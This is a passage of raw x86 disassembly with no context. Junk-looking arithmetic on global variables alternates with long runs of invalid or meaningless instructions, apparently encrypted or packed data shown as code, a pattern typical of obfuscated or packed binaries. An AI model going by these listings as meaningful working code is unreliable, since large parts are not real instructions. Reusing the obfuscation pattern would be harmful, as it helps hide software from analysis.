  40b23c:	mov    DWORD PTR [edx-0xfc6d2fd],ebp
  40b242:	xor    al,0xf4
  40b244:	xchg   ebx,eax
  40b245:	or     ch,BYTE PTR [edi]
  40b247:	and    al,0x69
  40b249:	jmp    0xf4617ca4
  40b24e:	or     eax,0x72b1d9d8
  40b253:	mov    dl,BYTE PTR [edi]
  40b255:	nop
  40b256:	xchg   ebp,eax
  40b257:	mov    DWORD PTR [eax+0x12],ecx
  40b25a:	pop    esi
  40b25b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b25c:	call   0xa069:0x5bd3e8ae
  40b263:	dec    esi
  40b264:	stos   DWORD PTR es:[edi],eax
  40b265:	cdq    
  40b266:	pop    eax
  40b267:	cmp    al,0xc
  40b269:	stos   BYTE PTR es:[edi],al
  40b26a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b26b:	fnsave [ebp+0x30]
  40b26e:	mov    bl,0x29
  40b270:	mov    WORD PTR [ecx],fs
  40b272:	push   edi
  40b273:	lods   al,BYTE PTR ds:[esi]
  40b274:	sti    
  40b275:	sub    dl,bh
  40b277:	ins    DWORD PTR es:[edi],dx
  40b278:	add    eax,0xa96671fd
  40b27d:	push   ss
  40b27e:	inc    ebp
  40b27f:	hlt    
  40b280:	js     0x40b296
  40b282:	jnp    0x40b29a
  40b284:	ins    DWORD PTR es:[edi],dx
  40b285:	(bad)  
  40b286:	and    esp,DWORD PTR [eax-0x6dc49670]
  40b28c:	outs   dx,DWORD PTR ds:[esi]
  40b28d:	add    ebp,DWORD PTR [esi]
  40b28f:	sub    DWORD PTR [ecx-0x7176f168],edx
  40b295:	xchg   edi,eax
  40b296:	imul   ecx,DWORD PTR ds:0x6e41d4e3,0xd3d76166
  40b2a0:	pop    edx
  40b2a1:	mov    al,BYTE PTR [ebx-0x28]
  40b2a4:	lods   al,BYTE PTR ds:[esi]
  40b2a5:	(bad)  
  40b2a6:	xchg   esp,eax
  40b2a7:	les    edx,FWORD PTR [ebp+0x5df9726f]
  40b2ad:	enter  0xec9f,0x71
  40b2b1:	rol    DWORD PTR [edx+0x5f46bf75],cl
  40b2b7:	push   edx
  40b2b8:	(bad)  
  40b2b9:	pop    edi
  40b2ba:	cmp    al,0x26
  40b2bc:	not    BYTE PTR [ebx+0x6d541ec]
  40b2c2:	mov    edx,0x28da27d6
  40b2c7:	ficomp DWORD PTR [esi]
  40b2c9:	stc    
  40b2ca:	pop    edx
  40b2cb:	inc    ecx
  40b2cc:	cmp    ch,BYTE PTR [esi*4+0x174f613e]
  40b2d3:	push   0x58e3531c
  40b2d8:	pop    ebx
  40b2d9:	scas   eax,DWORD PTR es:[edi]
  40b2da:	stos   BYTE PTR es:[edi],al
  40b2db:	nop
  40b2dc:	dec    ebp
  40b2dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2de:	pushf  
  40b2df:	neg    BYTE PTR [eax+eax*2-0x20]
  40b2e3:	iret   
  40b2e4:	ins    DWORD PTR es:[edi],dx
  40b2e5:	fwait
  40b2e6:	hlt    
  40b2e7:	dec    ebp
  40b2e8:	pop    eax
  40b2e9:	pop    ebx
  40b2ea:	or     esp,0xac2a43c9
  40b2f0:	push   ecx
  40b2f1:	mov    bh,0x15
  40b2f3:	mov    ch,0xeb
  40b2f5:	js     0x40b32b
  40b2f7:	cli    
  40b2f8:	push   edi
  40b2f9:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40b2fb:	jns    0x40b2df
  40b2fd:	aam    0x8f
  40b2ff:	mov    ch,0x11
  40b301:	rol    dh,0xcc
  40b304:	div    DWORD PTR [ebp-0x45]
  40b307:	cmp    esp,ebp
  40b309:	mov    al,0x3d
  40b30b:	jp     0x40b2f2
  40b30d:	jecxz  0x40b2f1
  40b30f:	sahf   
  40b310:	dec    edi
  40b311:	fneni(8087 only) 
  40b313:	cld    
  40b314:	push   eax
  40b315:	adc    DWORD PTR ds:0x4282ab,0x428263
  40b31f:	call   0x416c20
  40b324:	sbb    esi,DWORD PTR ds:0x428257
  40b32a:	mov    ecx,DWORD PTR [ebp-0x20]
  40b32d:	adc    esi,0x2986
  40b333:	mov    esi,DWORD PTR [ebp-0x1c]
  40b336:	sbb    DWORD PTR ds:0x4281eb,0x4282ab
  40b340:	push   0x5f43
  40b345:	or     edx,0x69b4
  40b34b:	sub    DWORD PTR ds:0x428343,0x4282ab
  40b355:	push   0x1657
  40b35a:	xor    DWORD PTR ds:0x42832b,0x42821f
  40b364:	or     eax,0x528b
  40b369:	xor    edx,esi
  40b36b:	xor    eax,ecx
  40b36d:	sub    DWORD PTR ds:0x42835f,0x4281ff
  40b377:	push   edx
  40b378:	push   eax
  40b379:	call   0x416c20
  40b37e:	xor    ecx,ecx
  40b380:	or     ecx,DWORD PTR ds:0x42825f
  40b386:	adc    DWORD PTR ds:0x428153,ecx
  40b38c:	mov    ecx,DWORD PTR [ebp-0x28]
  40b38f:	xor    DWORD PTR ds:0x4282c7,ecx
  40b395:	mov    esi,DWORD PTR [ebp-0x24]
  40b398:	and    DWORD PTR ds:0x428233,0x42821f
  40b3a2:	push   esi
  40b3a3:	add    DWORD PTR ds:0x42812b,0x5412
  40b3ad:	push   ecx
  40b3ae:	sub    DWORD PTR ds:0x428347,0x27f7
  40b3b8:	push   edx
  40b3b9:	push   eax
  40b3ba:	sub    DWORD PTR ds:0x428127,0x42835b
  40b3c4:	call   0x42202c
  40b3c9:	mov    DWORD PTR [ebp-0x30],eax
  40b3cc:	add    eax,DWORD PTR ds:0x42822b
  40b3d2:	mov    DWORD PTR [ebp-0x2c],edx
  40b3d5:	cmp    DWORD PTR ds:0x42825b,0x0
  40b3dc:	not    esi
  40b3de:	mov    DWORD PTR ds:0x428243,0x6e42
  40b3e8:	jmp    0x40b4a9
  40b3ed:	not    DWORD PTR ds:0x4282db
  40b3f3:	mov    eax,ds:0x428253
  40b3f8:	cmp    DWORD PTR ds:0x42825b,0x0
  40b3ff:	jl     0x40b428
  40b405:	push   0x2496
  40b40a:	push   DWORD PTR [ebp-0x28]
  40b40d:	call   DWORD PTR ds:0x428e9c
  40b413:	xor    edx,ecx
  40b415:	and    DWORD PTR ds:0x42814b,edx
  40b41b:	movzx  ecx,WORD PTR ds:0x42823b
  40b422:	or     DWORD PTR ds:0x4282cb,ecx
  40b428:	add    esi,edx
  40b42a:	adc    DWORD PTR ds:0x428127,0x1bfc
  40b434:	sub    esi,0x4a2f
  40b43a:	cmp    DWORD PTR ds:0x428353,0x0
  40b441:	mov    DWORD PTR ds:0x4282cb,ecx
  40b447:	mov    DWORD PTR ds:0x42834b,0x318c
  40b451:	mov    DWORD PTR ds:0x42835b,0x431a
  40b45b:	jmp    0x40b4a9
  40b460:	mov    DWORD PTR ds:0x428223,0x461b
  40b46a:	mov    DWORD PTR ds:0x42825f,0x63d9
  40b474:	cmp    DWORD PTR ds:0x428353,0x0
  40b47b:	jbe    0x40b49b
  40b481:	push   DWORD PTR [ebp-0x1c]
  40b484:	push   0x184b
  40b489:	call   DWORD PTR ds:0x428ea0
  40b48f:	xor    edx,DWORD PTR ds:0x428233
  40b495:	adc    ecx,DWORD PTR ds:0x42833b
  40b49b:	and    DWORD PTR ds:0x42812b,0x404c
  40b4a5:	and    edx,esi
  40b4a7:	add    ecx,edx
  40b4a9:	mov    DWORD PTR [ebp-0x10],0x5fa8
  40b4b0:	movzx  eax,WORD PTR ds:0x42823f
  40b4b7:	xor    DWORD PTR ds:0x428353,eax
  40b4bd:	mov    DWORD PTR [ebp-0xc],0x1751
  40b4c4:	dec    DWORD PTR ds:0x428223
  40b4ca:	mov    DWORD PTR [ebp-0x20],0x5e90
  40b4d1:	mov    DWORD PTR [ebp-0x1c],0xfc1
  40b4d8:	cmp    DWORD PTR ds:0x42813f,0x0
  40b4df:	mov    edx,0x29d6
  40b4e4:	mov    ecx,0x5377
  40b4e9:	not    esi
  40b4eb:	movzx  ecx,BYTE PTR ds:0x42811b
  40b4f2:	jmp    0x40b54e
  40b4f7:	mov    DWORD PTR ds:0x4281eb,0x9f5
  40b501:	mov    DWORD PTR ds:0x428267,0x1c35
  40b50b:	cmp    DWORD PTR ds:0x42813f,0x0
  40b512:	je     0x40b542
  40b518:	push   0x427f93
  40b51d:	push   0x400000
  40b522:	call   DWORD PTR ds:0x428d88
  40b528:	sbb    DWORD PTR ds:0x428257,edi
  40b52e:	mov    ecx,DWORD PTR ds:0x42818f
  40b534:	xor    edx,edx
  40b536:	or     edx,DWORD PTR ds:0x42837b
  40b53c:	sub    ecx,edx
  40b53e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40b542:	and    esi,DWORD PTR ds:0x42815b
  40b548:	sbb    esi,0x2386
  40b54e:	mov    DWORD PTR [ebp-0x28],0x7044
  40b555:	mov    DWORD PTR [ebp-0x24],0x7bf
  40b55c:	mov    eax,DWORD PTR [ebp-0x28]
  40b55f:	sbb    edx,DWORD PTR ds:0x428203
  40b565:	mov    ecx,DWORD PTR [ebp-0x24]
  40b568:	not    DWORD PTR ds:0x428233
  40b56e:	mov    edx,DWORD PTR [ebp-0x20]
  40b571:	or     DWORD PTR ds:0x428263,ecx
  40b577:	mov    esi,DWORD PTR [ebp-0x1c]
  40b57a:	sbb    DWORD PTR ds:0x42833b,0x428203
  40b584:	jmp    0x40b97a
  40b589:	adc    DWORD PTR [edx+0x10],esi
  40b58c:	packssdw mm5,QWORD PTR [edx+0xf]
  40b590:	jb     0x40b5e9
  40b592:	jnp    0x40b598
  40b594:	push   0xffffffde
  40b596:	xor    al,0x14
  40b598:	stos   BYTE PTR es:[edi],al
  40b599:	or     dl,BYTE PTR [ebx]
  40b59b:	sbb    BYTE PTR [eax],bl
  40b59d:	outs   dx,BYTE PTR ds:[esi]
  40b59e:	adc    bl,BYTE PTR [eax]
  40b5a0:	sbb    BYTE PTR [eax+0x71],ch
  40b5a3:	(bad)  
  40b5a4:	sub    DWORD PTR [edx+0x465f43e3],eax
  40b5aa:	jo     0x40b536
  40b5ac:	imul   ebp,eax,0xffffffbc
  40b5af:	(bad)  
  40b5b0:	clc    
  40b5b1:	(bad)  
  40b5b2:	shl    BYTE PTR [ecx+0x72],cl
  40b5b5:	jg     0x40b546
  40b5b7:	ja     0x40b569
  40b5b9:	push   ebp
  40b5ba:	mov    bl,0xe0
  40b5bc:	gs mov al,0x3a
  40b5bf:	push   ebx
  40b5c0:	jmp    0x72f3638a
  40b5c5:	xor    eax,0x6d61c01c
  40b5ca:	mov    fs,WORD PTR [esi+0x4bfb0e7a]
  40b5d0:	pop    ss
  40b5d1:	stos   BYTE PTR es:[edi],al
  40b5d2:	ror    BYTE PTR [esi+0x4dbf1c49],1
  40b5d8:	pop    esi
  40b5d9:	hlt    
  40b5da:	mov    ebx,0x92e42b4b
  40b5df:	aam    0xf
  40b5e1:	out    0x33,eax
  40b5e3:	dec    edi
  40b5e4:	jecxz  0x40b56b
  40b5e6:	mov    BYTE PTR cs:[ebx-0x8],0xff
  40b5eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5ec:	push   ss
  40b5ed:	ret    0x9400
  40b5f0:	sub    esp,DWORD PTR [ebx]
  40b5f2:	mov    ds:0xb6325969,eax
  40b5f7:	bound  eax,QWORD PTR [edx]
  40b5f9:	outs   dx,BYTE PTR ds:[esi]
  40b5fa:	cmp    ecx,DWORD PTR [ebp+0x5c]
  40b5fd:	sbb    eax,0x661fadc2
  40b602:	outs   dx,DWORD PTR ds:[esi]
  40b603:	ins    DWORD PTR es:[edi],dx
  40b604:	jnp    0x40b674
  40b606:	mov    esp,0x3bd8ed8a
  40b60b:	loop   0x40b671
  40b60d:	cmp    eax,0xf686b21
  40b612:	retf   0x25fb
  40b615:	dec    esi
  40b616:	inc    DWORD PTR [edx-0x13af8811]
  40b61c:	sub    al,0x11
  40b61e:	sbb    BYTE PTR [ebp+0x5092c2d8],0xd3
  40b625:	jne    0x40b5fd
  40b627:	mov    bl,0xd1
  40b629:	xor    DWORD PTR [esi],eax
  40b62b:	and    BYTE PTR [edx+0x76],0x60
  40b62f:	jl     0x40b678
  40b631:	xlat   BYTE PTR ds:[ebx]
  40b632:	dec    edi
  40b633:	dec    esi
  40b634:	pop    ds
  40b635:	cmp    BYTE PTR [edx+0x2634e04e],cl
  40b63b:	add    ebp,DWORD PTR [ecx]
  40b63d:	mov    DWORD PTR [ecx+0x7b],eax
  40b640:	ins    BYTE PTR es:[edi],dx
  40b641:	mov    es,edx
  40b643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b644:	sbb    eax,0xb0337aa
  40b649:	retf   0xf280
  40b64c:	mov    ebx,0xa2c7dcff
  40b651:	xor    ebp,DWORD PTR [ebx]
  40b653:	push   edx
  40b654:	daa    
  40b655:	push   ss
  40b656:	iret   
  40b657:	hlt    
  40b658:	sub    al,0x45
  40b65a:	fwait
  40b65b:	aas    
  40b65c:	pop    ds
  40b65d:	push   es
  40b65e:	in     eax,0x60
  40b660:	lds    edi,FWORD PTR [edx-0x48]
  40b663:	or     cl,BYTE PTR [eax+0x63]
  40b666:	cmp    ebx,DWORD PTR [edi]
  40b668:	jo     0x40b6a9
  40b66a:	sbb    al,0x7d
  40b66c:	mov    DWORD PTR [ebp+0x2d],esi
  40b66f:	xlat   BYTE PTR ds:[ebx]
  40b670:	adc    al,0x1f
  40b672:	ja     0x40b612
  40b674:	fcmovnbe st,st(4)
  40b676:	repz cdq 
  40b678:	mov    bl,0x97
  40b67a:	and    eax,0x2cfb4a01
  40b67f:	jp     0x40b633
  40b681:	sub    DWORD PTR gs:[eax-0x31],esp
  40b685:	dec    eax
  40b686:	jno    0x40b649
  40b688:	fcom   QWORD PTR [edx-0x2]
  40b68b:	sbb    eax,0x69500d6d
  40b690:	in     eax,0xac
  40b692:	mov    dl,0x23
  40b694:	mov    al,ds:0xf48331fa
  40b699:	jmp    0x40b717
  40b69b:	popa   
  40b69c:	xor    BYTE PTR [edx-0x63],0xd5
  40b6a0:	sub    BYTE PTR [edi+0xf],dh
  40b6a3:	jge    0x40b695
  40b6a5:	int    0x18
  40b6a7:	adc    BYTE PTR [ebx],cl
  40b6a9:	push   ebx
  40b6aa:	scas   eax,DWORD PTR es:[edi]
  40b6ab:	stos   BYTE PTR es:[edi],al
  40b6ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6ad:	add    dl,BYTE PTR [ebp-0x25]
  40b6b0:	add    al,0xbc
  40b6b2:	outs   dx,BYTE PTR ds:[esi]
  40b6b3:	stos   DWORD PTR es:[edi],eax
  40b6b4:	stos   BYTE PTR es:[edi],al
  40b6b5:	pop    ss
  40b6b6:	push   0x2c8e5d56
  40b6bb:	jb     0x40b71d
  40b6bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6bf:	add    ch,BYTE PTR [ecx]
  40b6c1:	mov    esi,0xe4952c14
  40b6c6:	dec    ecx
  40b6c7:	jp     0x40b743
  40b6c9:	sti    
  40b6ca:	and    BYTE PTR [esi-0x7a],ch
  40b6cd:	das    
  40b6ce:	in     eax,0xc1
  40b6d0:	add    eax,0xa14a1282
  40b6d5:	enter  0xfe72,0x21
  40b6d9:	jne    0x40b6ce
  40b6db:	sti    
  40b6dc:	fcmovu st,st(3)
  40b6de:	lods   eax,DWORD PTR ds:[esi]
  40b6df:	push   es
  40b6e0:	pop    edi
  40b6e1:	test   ebp,ecx
  40b6e3:	bound  eax,QWORD PTR [eax]
  40b6e5:	and    eax,0x7bc4235c
  40b6ea:	push   ds
  40b6eb:	jg     0x40b769
  40b6ed:	push   ebp
  40b6ee:	scas   al,BYTE PTR es:[edi]
  40b6ef:	in     al,dx
  40b6f0:	cli    
  40b6f1:	into   
  40b6f2:	xchg   ebp,eax
  40b6f3:	test   DWORD PTR [ebx+0x666edd7c],ecx
  40b6f9:	cli    
  40b6fa:	hlt    
  40b6fb:	mov    ds:0xea6f9bb5,al
  40b700:	push   ebp
  40b701:	jecxz  0x40b747
  40b703:	fbstp  TBYTE PTR ds:0xb6e5b8fb
  40b709:	xchg   DWORD PTR [ebp-0x70],ebp
  40b70c:	pop    esi
  40b70d:	push   ss
  40b70e:	pop    ss
  40b70f:	mov    al,0x16
  40b711:	jne    0x40b6e3
  40b713:	aam    0xfa
  40b715:	sbb    eax,0x9e8d1173
  40b71a:	mov    esp,0x8caf8674
  40b71f:	mov    esi,0x55411077
  40b724:	leave  
  40b725:	pop    esp
  40b726:	pop    ebx
  40b727:	les    edi,FWORD PTR [ebp-0x162f2ba5]
  40b72d:	aam    0x45
  40b72f:	sbb    ah,BYTE PTR [esi-0x1b]
  40b732:	adc    BYTE PTR [edi+0x50],cl
  40b735:	xor    eax,0xe4bd3704
  40b73a:	fnsave ds:0x6d075fab
  40b740:	test   eax,0xb6a92262
  40b745:	xchg   edi,eax
  40b746:	lods   eax,DWORD PTR ds:[esi]
  40b747:	inc    edi
  40b748:	sub    ebx,DWORD PTR [edx+0xd9ed8df]
  40b74e:	scas   al,BYTE PTR es:[edi]
  40b74f:	pop    ebp
  40b750:	loope  0x40b6f8
  40b752:	inc    ebp
  40b753:	je     0x40b6dd
  40b755:	enter  0x35f5,0x2e
  40b759:	pop    esp
  40b75a:	xor    BYTE PTR [ebx+0x3d720703],cl
  40b760:	repnz push cs
  40b762:	pop    eax
  40b763:	mov    eax,0xe3e4eadf
  40b768:	test   BYTE PTR [eax+0x4c4d0707],ch
  40b76e:	das    
  40b76f:	std    
  40b770:	xchg   ebp,eax
  40b771:	repz mov edx,0xad9897f0
  40b777:	add    eax,0x744846b2
  40b77c:	aad    0xe
  40b77e:	mov    ch,0x31
  40b780:	cmp    eax,0x3a4e9b95
  40b785:	cli    
  40b786:	xchg   esi,eax
  40b787:	fprem  
  40b789:	shrd   DWORD PTR [ebx+0x99592ef],ebp,0xcd
  40b791:	xchg   edi,eax
  40b792:	or     DWORD PTR ds:0x34af70b0,ecx
  40b798:	(bad)  
  40b799:	fisttp WORD PTR [ebx+0x79]
  40b79c:	retf   0x3fa9
  40b79f:	jmp    0xd8aa:0x8fb826e3
  40b7a6:	xchg   ebp,eax
  40b7a7:	push   0x90ecf2f1
  40b7ac:	inc    esp
  40b7ad:	push   ebp
  40b7ae:	push   ss
  40b7af:	and    BYTE PTR [ecx+0x67],bh
  40b7b2:	lea    edx,[ecx+0x2c]
  40b7b5:	add    BYTE PTR ds:0x430479df,0xcd
  40b7bc:	cdq    
  40b7bd:	xchg   ecx,eax
  40b7be:	das    
  40b7bf:	adc    al,0xa8
  40b7c1:	ja     0x40b80c
  40b7c3:	popa   
  40b7c4:	xchg   esi,eax
  40b7c5:	sahf   
  40b7c6:	xor    DWORD PTR ss:[esi],edx
  40b7c9:	add    al,0xd3
  40b7cb:	ins    BYTE PTR es:[edi],dx
  40b7cc:	aad    0x46
  40b7ce:	jno    0x40b791
  40b7d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7d1:	mov    eax,0x3eae931a
  40b7d6:	rcl    BYTE PTR [eax+0x8],cl
  40b7d9:	mov    eax,0xd95ead43
  40b7de:	aam    0x3
  40b7e0:	mov    DWORD PTR [ecx],esp
  40b7e2:	sub    DWORD PTR [ebx-0x3477f910],esi
  40b7e8:	repz rcr bh,0xd4
  40b7ec:	jl     0x40b7aa
  40b7ee:	jno    0x40b815
  40b7f0:	mov    DWORD PTR [ecx-0x4f],esp
  40b7f3:	icebp  
  40b7f4:	push   0x33
  40b7f6:	mov    ebp,eax
  40b7f8:	sbb    al,0x7d
  40b7fa:	cmp    al,0x96
  40b7fc:	out    dx,eax
  40b7fd:	lahf   
  40b7fe:	lods   eax,DWORD PTR ds:[esi]
  40b7ff:	jle    0x40b814
  40b801:	rol    DWORD PTR ds:0x8a28dea9,0xe8
  40b808:	jg     0x40b78a
  40b80a:	ins    DWORD PTR es:[edi],dx
  40b80b:	cmp    BYTE PTR [eax+0x69],dl
  40b80e:	sahf   
  40b80f:	pop    edi
  40b810:	adc    ecx,edx
  40b812:	sti    
  40b813:	iret   
  40b814:	cld    
  40b815:	loopne 0x40b7d7
  40b817:	es loop 0x40b7ca
  40b81a:	shl    BYTE PTR [ebx+ecx*8+0xb],1
  40b81e:	retf   0xd2bc
  40b821:	(bad)  
  40b822:	sbb    BYTE PTR [esi+0x7ec83c4b],ah
  40b828:	inc    esi
  40b829:	sar    al,1
  40b82b:	popf   
  40b82c:	inc    edi
  40b82d:	mov    al,0x4e
  40b82f:	mov    edx,0xe1ff7660
  40b834:	cmp    edx,eax
  40b836:	(bad)  
  40b837:	push   ebp
  40b838:	mov    eax,ds:0x75a812c8
  40b83d:	int3   
  40b83e:	out    0x64,eax
  40b840:	je     0x40b7db
  40b842:	jecxz  0x40b859
  40b844:	cmc    
  40b845:	out    0xdc,eax
  40b847:	pop    edi
  40b848:	stos   BYTE PTR es:[edi],al
  40b849:	pop    ebx
  40b84a:	in     eax,dx
  40b84b:	lea    ecx,[edx+0x5da88684]
  40b851:	and    al,0x19
  40b853:	push   eax
  40b854:	out    0x58,eax
  40b856:	fdivr  st,st(4)
  40b858:	sub    eax,0x4dda9d05
  40b85d:	and    ch,0x3e
  40b860:	arpl   WORD PTR [ebp-0x6e],sp
  40b863:	jbe    0x40b8d5
  40b865:	cmp    al,0x9a
  40b867:	adc    BYTE PTR [esi+0x25f04c51],ch
  40b86d:	(bad)  
  40b86e:	stos   BYTE PTR es:[edi],al
  40b86f:	pop    ebx
  40b870:	fabs   
  40b872:	addr16 pushf 
  40b874:	out    dx,al
  40b875:	out    dx,eax
  40b876:	and    BYTE PTR [edx-0x60],0xdc
  40b87a:	mov    cl,0xca
  40b87c:	jp     0x40b888
  40b87e:	xor    DWORD PTR [ebx],eax
  40b880:	xchg   ecx,eax
  40b881:	jmp    0x40b865
  40b883:	dec    edx
  40b884:	adc    al,0xba
  40b886:	shl    BYTE PTR [ebx-0x41e43c14],0xf0
  40b88d:	cmp    BYTE PTR [edi+edi*1+0x7e],0x53
  40b892:	popf   
  40b893:	mov    eax,ds:0x9993861c
  40b898:	fwait
  40b899:	aad    0x85
  40b89b:	sahf   
  40b89c:	sub    ecx,edx
  40b89e:	cs mov ebp,0xa5a77c5a
  40b8a4:	mov    bl,0xce
  40b8a6:	mov    bh,0xbe
  40b8a8:	sub    BYTE PTR ds:0xe52b7d9f,ah
  40b8ae:	adc    eax,0x6efbc429
  40b8b3:	aad    0xcb
  40b8b5:	not    esp
  40b8b7:	add    al,0x5e
  40b8b9:	sub    eax,0x3211a089
  40b8be:	mov    ds:0xf9cb0a75,al
  40b8c3:	cli    
  40b8c4:	inc    ecx
  40b8c5:	cs sbb ecx,ebp
  40b8c8:	scas   al,BYTE PTR es:[edi]
  40b8c9:	xor    al,0x82
  40b8cb:	jl     0x40b8bc
  40b8cd:	adc    cl,BYTE PTR [ebx]
  40b8cf:	out    dx,al
  40b8d0:	call   0xec4a:0xeb407f8c
  40b8d7:	xor    BYTE PTR [ecx],cl
  40b8d9:	mov    eax,ds:0xb8e650c1
  40b8de:	push   0xb206b314
  40b8e3:	cmp    edi,edx
  40b8e5:	shl    BYTE PTR [eax+esi*8],0xe3
  40b8e9:	nop
  40b8ea:	pop    eax
  40b8eb:	std    
  40b8ec:	pop    ds
  40b8ed:	xlat   BYTE PTR ds:[ebx]
  40b8ee:	adc    al,0x68
  40b8f0:	pop    esp
  40b8f1:	nop
  40b8f2:	add    al,0xe8
  40b8f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8f5:	xchg   esp,eax
  40b8f6:	jmp    0x40b960
  40b8f8:	inc    ebx
  40b8f9:	(bad)  
  40b8fa:	push   ebx
  40b8fb:	aam    0x4
  40b8fd:	xchg   edi,eax
  40b8fe:	bound  eax,QWORD PTR [edx+0x55]
  40b901:	add    esi,DWORD PTR [edi]
  40b903:	in     al,0xb4
  40b905:	jecxz  0x40b8fa
  40b907:	in     eax,0x8d
  40b909:	sbb    BYTE PTR [edx-0x80],bh
  40b90c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b90d:	push   0xd4f45e00
  40b912:	add    al,0x24
  40b914:	in     eax,0x43
  40b916:	adc    BYTE PTR [ecx],dh
  40b918:	retf   0x1f7f
  40b91b:	sub    DWORD PTR [edi],esp
  40b91d:	mul    DWORD PTR [edi+0x7d2c1d80]
  40b923:	pop    esp
  40b924:	pop    ebx
  40b925:	or     eax,0x5c358ef4
  40b92a:	imul   esp,eax,0x75
  40b92d:	fnstenv cs:[edx+0x7]
  40b931:	enter  0x396,0x1f
  40b935:	test   ecx,ebp
  40b937:	pop    edi
  40b938:	adc    DWORD PTR [esi],edi
  40b93a:	fnsave [edi+0x4b]
  40b93d:	and    BYTE PTR [esi],ah
  40b93f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b940:	in     al,0xcd
  40b942:	mov    bh,0xb3
  40b944:	loop   0x40b962
  40b946:	fnstcw WORD PTR [eax+0x64]
  40b949:	loopne 0x40b941
  40b94b:	xchg   edi,eax
  40b94c:	psraw  mm1,QWORD PTR [edx]
  40b94f:	pop    ecx
  40b950:	ds arpl sp,cx
  40b953:	lods   eax,DWORD PTR ds:[esi]
  40b954:	mov    DWORD PTR [edi],ebp
  40b956:	jmp    0x40b93f
  40b958:	push   ecx
  40b959:	xor    BYTE PTR [ebx+edi*4],dh
  40b95c:	in     al,0xbd
  40b95e:	pop    edx
  40b95f:	pop    eax
  40b960:	stc    
  40b961:	xchg   esi,eax
  40b962:	xor    dh,BYTE PTR [ebp-0x47]
  40b965:	mov    ds:0xe7b109ab,eax
  40b96a:	sub    eax,0x6f50ca09
  40b96f:	fisubr WORD PTR ds:0x43178940
  40b975:	mov    ebp,0x3385bb9c
  40b97a:	add    eax,0x355c
  40b97f:	adc    ecx,0x819
  40b985:	adc    DWORD PTR ds:0x4282b3,0xc1d
  40b98f:	or     eax,edx
  40b991:	mov    edx,DWORD PTR [ebp-0x10]
  40b994:	or     ecx,esi
  40b996:	and    esi,DWORD PTR ds:0x428237
  40b99c:	mov    esi,DWORD PTR [ebp-0xc]
  40b99f:	and    DWORD PTR ds:0x4282c7,0x1cd5
  40b9a9:	or     eax,edx
  40b9ab:	cmp    DWORD PTR ds:0x4282cf,0x0
  40b9b2:	mov    edx,0xd4e
  40b9b7:	not    edx
  40b9b9:	mov    DWORD PTR ds:0x428237,0x1f80
  40b9c3:	jmp    0x40ba42
  40b9c8:	mov    DWORD PTR ds:0x4282cf,0x2492
  40b9d2:	mov    DWORD PTR ds:0x42835f,0xa5a
  40b9dc:	cmp    DWORD PTR ds:0x4282cf,0x0
  40b9e3:	jbe    0x40ba20
  40b9e9:	push   DWORD PTR [ebp-0x1c]
  40b9ec:	push   0x148d
  40b9f1:	call   DWORD PTR ds:0x428d8c
  40b9f7:	adc    DWORD PTR ds:0x42835b,0x175a
  40ba01:	not    edx
  40ba03:	movzx  edx,WORD PTR ds:0x4282b7
  40ba0a:	sub    edx,DWORD PTR ds:0x4282cb
  40ba10:	mov    DWORD PTR ds:0x4282b7,edx
  40ba16:	adc    DWORD PTR ds:0x4282b3,0x62d2
  40ba20:	mov    edx,DWORD PTR ds:0x428127
  40ba26:	xor    DWORD PTR ds:0x428353,edx
  40ba2c:	or     DWORD PTR ds:0x4281ff,0x5c0
  40ba36:	mov    edx,DWORD PTR ds:0x428237
  40ba3c:	or     DWORD PTR ds:0x4282d3,edx
  40ba42:	mov    edx,DWORD PTR [ebp-0x30]
  40ba45:	or     ecx,esi
  40ba47:	mov    esi,DWORD PTR [ebp-0x2c]
  40ba4a:	or     eax,0xf34
  40ba4f:	or     ecx,0x6c90
  40ba55:	cmp    edx,eax
  40ba57:	jne    0x40ba65
  40ba5d:	cmp    esi,ecx
  40ba5f:	je     0x40cc06
  40ba65:	mov    DWORD PTR [ebp-0x30],0x5ddc
  40ba6c:	mov    DWORD PTR [ebp-0x2c],0x7433
  40ba73:	mov    eax,DWORD PTR [ebp-0x30]
  40ba76:	mov    ecx,DWORD PTR [ebp-0x2c]
  40ba79:	xor    ecx,0xfffffd1f
  40ba7f:	xor    eax,0xffff9fff
  40ba84:	and    ecx,0x6e0
  40ba8a:	and    eax,0x6244
  40ba8f:	mov    DWORD PTR [ebp-0x10],eax
  40ba92:	jmp    0x40be88
  40ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba99:	test   al,0x41
  40ba9b:	test   al,0x3d
  40ba9d:	sbb    al,0x1c
  40ba9f:	fdiv   QWORD PTR [edx]
  40baa1:	mov    bl,0x7c
  40baa3:	out    dx,eax
  40baa4:	sti    
  40baa5:	adc    BYTE PTR [esi+0x60],bh
  40baa8:	or     eax,0x126e1818
  40baad:	sbb    BYTE PTR [eax],bl
  40baaf:	es fdiv st,st(0)
  40bab2:	stc    
  40bab3:	jle    0x40ba54
  40bab5:	mov    eax,0x9c8d6bb4
  40baba:	loope  0x40ba4c
  40babc:	pushf  
  40babd:	test   BYTE PTR [eax+ecx*1-0x6ffcc885],0x9d
  40bac5:	pop    edi
  40bac6:	mov    eax,esi
  40bac8:	scas   eax,DWORD PTR es:[edi]
  40bac9:	lahf   
  40baca:	bound  ebp,QWORD PTR [edi+0x54]
  40bacd:	xor    BYTE PTR [eax+0xd97b192],dh
  40bad3:	inc    eax
  40bad4:	dec    esi
  40bad5:	cmp    eax,DWORD PTR [eax+0x1f4ed159]
  40badb:	adc    al,0x4c
  40badd:	sub    al,0x7a
  40badf:	fimul  WORD PTR [edx]
